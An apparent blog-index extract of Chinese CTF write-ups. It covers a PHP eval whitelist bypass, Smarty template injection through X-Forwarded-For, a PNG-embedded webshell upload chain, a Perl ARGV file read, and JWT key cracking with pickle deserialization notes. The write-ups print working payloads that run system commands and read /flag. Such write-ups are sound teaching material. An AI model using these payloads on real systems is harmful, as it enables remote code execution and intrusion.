<span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//帮你算出答案</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> </code></pre>
<ol>
<li>payload长度不能超过80</li>
<li>payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 这些字符</li>
<li>payload中不能有不是$whitelist白名单里面的单词出现</li>
</ol>
<p><strong>base_convert() 函数：在任意进制之间转换数字</strong></p>
<p><strong>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符</strong></p>
<p><strong>dechex() 函数把十进制转换为十六进制</strong></p>
<pre><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac /flag</code></pre>
<ul>
<li>base_convert(37907361743,10,36) =&gt; “hex2bin”</li>
<li>dechex(1598506324) =&gt; “5f474554”</li>
<li>$pi=hex2bin(“5f474554”) =&gt; $pi=”_GET”   //hex2bin将一串16进制数转换为二进制字符串</li>
<li>($$pi){pi}(($$pi){abs}) =&gt; ($GET){pi}($_GET){abs}  //{}可以代替[]</li>
</ul>
<pre><code>?c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))(){1})//exec(getallheaders(){1})</code></pre>
<ul>
<li>base_convert(696468,10,36) =&gt; “exec”</li>
<li>$pi(8768397090111664438,10,30) =&gt; “getallheaders”</li>
<li>exec(getallheaders(){1})</li>
<li>//操作xx和yy，中间用逗号隔开，echo都能输出echo xx,yy</li>
</ul>
<pre><code>?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></pre>
]]></content>
  </entry>
  <entry>
    <title>CISCN:2019-Web11</title>
    <url>/2021/07/17/ciscn-2019-web11/</url>
    <content><![CDATA[<p><img src="/2021/07/17/ciscn-2019-web11/1.png" alt="1"></p>
<pre class=" language-php"><code class="language-php">X<span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">}</span></code></pre>
<pre class=" language-php"><code class="language-php">X<span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat ../../../../../../../../flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>
<pre class=" language-php"><code class="language-php">X<span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">}</span></code></pre>
<p><img src="/2021/07/17/ciscn-2019-web11/2.png" alt="2"></p>
<p><img src="/2021/07/17/ciscn-2019-web11/3.png" alt="3"></p>
]]></content>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN：2021-Upload</title>
    <url>/2021/09/06/ciscn-2021-upload/</url>
    <content><![CDATA[<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"这么大个的东西你是想d我吗？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$imageinfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"如果不能好好传图片的话就还是不要来打扰我了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"东西不能方方正正的话就很讨厌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string">"i"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string">"ph"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"有些东西让你传上去的话那可不得了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$imagePath</span> <span class="token operator">=</span> <span class="token string">"image/"</span> <span class="token punctuation">.</span> <span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"postedFile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imagePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"upload success, image at $imagePath"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"传都没有传上去"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>$_FILES这个经由 HTTP POST 文件上传而提交至脚本的变量。类似于旧数组 $HTTP_POST_FILES 数组。</p>
<pre><code>$_FILES数组内容如下:
&lt;input type="file" name="userfile"&gt;
$_FILES['userfile']['name']
客户端机器文件的原名称。
$_FILES['userfile']['type'] 
文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。
$_FILES['userfile']['size'] 
已上传文件的大小，单位为字节。
$_FILES['userfile']['tmp_name'] 
文件被上传后在服务端储存的临时文件名。
$_FILES['userfile']['error'] 
和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。
注: 在 PHP 4.1.0 版本以前该数组的名称为 $HTTP_POST_FILES，它并不像 $_FILES 一样是自动全局变量。PHP 3 不支持 $HTTP_POST_FILE</code></pre>
<ol>
<li>上传需要绕过<code>getimagesize</code>。</li>
<li>图片的长宽必须为1.</li>
<li>文件名不能有c、i、h</li>
</ol>
<p>绕过<code>getimagesize</code>比较简单使用XMB头就行了</p>
<pre><code>#define test_width 1
#define test_height 1</code></pre>
<h5 id="example-php"><a href="#example-php" class="headerlink" title="example.php"></a>example.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string">"poc"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name_for_zip</span> <span class="token operator">=</span> <span class="token string">"example/"</span> <span class="token punctuation">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"要不咱们再看看？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"都不能解压呢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">echo</span> <span class="token string">"可以解压，我想想存哪里"</span><span class="token punctuation">;</span>
    <span class="token variable">$pos_for_zip</span> <span class="token operator">=</span> <span class="token string">"/tmp/example/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$pos_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"$pos_for_zip/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">imagecrop</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'x'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'y'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'width'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token string">'height'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$size</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$second</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$final_name</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">,</span> <span class="token string">'example/'</span><span class="token punctuation">.</span><span class="token variable">$final_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>为了绕过图片检测并实现木马的写入我们使用这个脚本。</p>
<p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a></p>
<p>首先要修改脚本中的payload。</p>
<p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p>左侧是搜索功能，这个图片编码就按这么三项来就好。<br><img src="/2021/09/06/ciscn-2021-upload/1.png" alt="image-20210907205659538"></p>
<p><img src="/2021/09/06/ciscn-2021-upload/2.png" alt="image-20210907170317139"></p>
<p>把原来的改为这个</p>
<p>a39f67641d201612546f112e29152b2167226b505050506f5f5310</p>
<p>修改脚本里的这两个地方：</p>
<p><img src="/2021/09/06/ciscn-2021-upload/3.png" alt="image-20210907210012756"></p>
<p>生成a.png文件</p>
<p><img src="/2021/09/06/ciscn-2021-upload/4.png" alt="image-20210907210040943"></p>
<p>修改图片后缀为php然后压缩成zip</p>
<p>生成HTML文件并用浏览器打开</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;POST数据包POC&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action="http://65540e4b-2909-440d-ad52-b4979373fc78.node4.buuoj.cn:81/upload.php?ctf=upload" method="post" enctype="multipart/form-data"&gt;
&lt;!--链接是当前打开的题目链接--&gt;
    &lt;label for="file"&gt;文件名：&lt;/label&gt;
    &lt;input type="file" name="postedFile" id="postedFile"&gt;&lt;br&gt;
    &lt;input type="submit" name="submit" value="提交"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>上传文件并抓包，修改文件名并添加长度绕过的字符串。</p>
<p><img src="/2021/09/06/ciscn-2021-upload/5.png" alt="image-20210907210431347"></p>
<p>解压文件：</p>
<p><img src="/2021/09/06/ciscn-2021-upload/6.png" alt="image-20210907211238456"></p>
<p>蚁剑连接</p>
<pre><code>http://65540e4b-2909-440d-ad52-b4979373fc78.node4.buuoj.cn:81/example/a.php</code></pre>
<p><img src="/2021/09/06/ciscn-2021-upload/7.png" alt="image-20210907211444842"></p>
]]></content>
  </entry>
  <entry>
    <title>CSAW2016：i_got_id</title>
    <url>/2021/10/29/csaw2016-i-got-id/</url>
    <content><![CDATA[<p>猜测Perl File Upload后端代码为:</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">use</span> <span class="token package">strict</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">warnings</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">CGI</span><span class="token punctuation">;</span>

my <span class="token variable">$cgi</span><span class="token operator">=</span> <span class="token constant">CGI</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">new</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span> <span class="token string">'file'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
my <span class="token variable">$file</span><span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span> <span class="token string">'file'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token markup">&lt;$file></span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">print</span> <span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre>
<p>其中my $file= $cgi-&gt;param( ‘file’ );：<br>param()函数返回一个列表的文件。但是只有第一个文件会被放入file变量中。</p>
<p>while ( &lt;$file&gt; )中，&lt;&gt;不能处理字符串，除非是ARGV，因此循环遍历并将每个值使用open()<br>调用。</p>
<p>对于读文件，如果传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。<br>所以，在上传的正常文件前加上一个文件上传项ARGV，然后在URL中传入文件路径参数，就可以读取任意文件。</p>
<p>在上传文件时抓取数据包：</p>
<p><img src="/2021/10/29/csaw2016-i-got-id/image-20211029215740211.png" alt="image-20211029215740211"></p>
]]></content>
      <tags>
        <tag>Perl</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN:2019-iKun</title>
    <url>/2021/07/25/ciscn-2019-ikun/</url>
    <content><![CDATA[<h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><p><a href="http://lxh3ng.github.io/2021/07/24/json-web-token/">http://LXH3ng.github.io/2021/07/24/json-web-token/</a></p>
<h2 id="Python魔法方法指南"><a href="#Python魔法方法指南" class="headerlink" title="Python魔法方法指南"></a>Python魔法方法指南</h2><p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055">https://blog.csdn.net/bluehawksky/article/details/79027055</a></p>
<h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><p>参考<a href="https://www.cnblogs.com/wangtanzhi/p/12178311.html">https://www.cnblogs.com/wangtanzhi/p/12178311.html</a></p>
<p>pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p>
<p>pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，<br> pickle序列化后的数据，可读性差，人一般无法识别。</p>
<p>p = pickle.loads(urllib.unquote(become))</p>
<p>urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 =  value2的形式pickle.loads(bytes_object):  从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：</p>
<p>（1）pickle.dump(obj, file, [,protocol])</p>
<pre><code>    函数的功能：将obj对象序列化存入已经打开的file中。

   参数讲解：

obj：想要序列化的obj对象。
file:文件名称。
protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre>
<p>（2）pickle.load(file)</p>
<pre><code>    函数的功能：将file中的对象序列化读出。

    参数讲解：

file：文件名称。</code></pre>
<p>（3）pickle.dumps(obj[, protocol])</p>
<pre><code>   函数的功能：将obj对象序列化为string形式，而不是存入文件中。

   参数讲解：

obj：想要序列化的obj对象。
protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre>
<p>（4）pickle.loads(string)</p>
<pre><code>   函数的功能：从string中读出序列化前的obj对象。

   参数讲解：

string：文件名称。

 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</code></pre>
<p>检测反序列化方法：</p>
<pre><code>全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。</code></pre>
<p>防御方法</p>
<pre><code>1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法；

2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</code></pre>
<h2 id="CISCN-2019-iKun"><a href="#CISCN-2019-iKun" class="headerlink" title="CISCN:2019-iKun"></a>CISCN:2019-iKun</h2><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195120596.png" alt="image-20210726195120596"></p>
<p>ikun们冲鸭,一定要买到lv6!!!</p>
<p>用python脚本爆破出lv6</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">"http://http://2018cc7d-054e-441d-a785-5701d87e6da9.node4.buuoj.cn/shop?page="</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">break</span></code></pre>
<p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195347258.png" alt="image-20210726195347258"></p>
<p>好像有点贵</p>
<p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195509076.png" alt="image-20210726195509076"></p>
<p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195548608.png" alt="image-20210726195548608"></p>
<p>抓包看到这里有JWT和discount</p>
<p>破解<a href="https://codechina.csdn.net/mirrors/brendan-rius/c-jwt-cracker?utm_source=csdn_github_accelerator">sha256的key</a></p>
<p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195912776.png" alt="image-20210726195912776"></p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></pre>
<p>并修改discount=0.00000001</p>
<p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726200858551.png" alt="image-20210726200858551"></p>
<p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726200915609.png" alt="image-20210726200915609"></p>
